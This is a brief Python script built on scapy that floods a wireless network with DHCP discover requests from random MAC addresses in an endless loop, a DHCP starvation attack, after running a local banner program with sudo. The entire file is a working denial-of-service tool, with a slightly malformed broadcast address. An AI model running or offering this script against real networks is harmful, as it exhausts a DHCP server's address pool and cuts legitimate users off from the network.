#!/bin/python3

import os
import time
from scapy.all import *

conf.checkIPaddr = False


os.system(
         f"sudo ./banner"
         )



print("The Script Started Succuseffuly.................\n")



dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff' ,src=RandMAC()) \
                     /IP(src='0.0.0.0' ,dst='255.255.255.0') \
                     /UDP(sport=68,dport=67) \
                     /BOOTP(op=1,chaddr = RandMAC()) \
                     /DHCP(options=[('message-type','discover'),("end")])
                     
sendp(dhcp_discover,iface="wlan0",loop=1,verbose=1)          
